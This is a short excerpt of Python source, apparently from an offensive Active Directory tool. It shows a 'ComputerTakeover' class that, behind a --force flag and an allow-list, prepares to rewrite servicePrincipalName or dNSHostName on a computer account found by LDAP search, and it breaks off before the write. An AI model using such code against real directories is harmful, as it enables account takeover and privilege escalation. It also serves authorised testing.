...
class ComputerTakeover:
    def run(self, target: Target, session: Session, graph: AttackGraph, *, force: bool = False, **kwargs: Any) -> dict[str, Any]:
        ...
        change_target, attribute, value = kwargs.get("write_target"), kwargs.get("attribute"), kwargs.get("value")
        change = None
        if change_target or attribute or value:
            if not force or not all((change_target, attribute, value)):
                raise RuntimeError("Approved identity change requires --force, --write-target, --attribute, and --value")
            if attribute not in {"servicePrincipalName", "dNSHostName", "msDS-AdditionalDnsHostName"}:
                raise RuntimeError("Attribute is not approved for this capability")
            conn.search(base_dn, f"(sAMAccountName={change_target})", search_scope=SUBTREE, attributes=["distinguishedName", attribute])
            if not conn.entries:
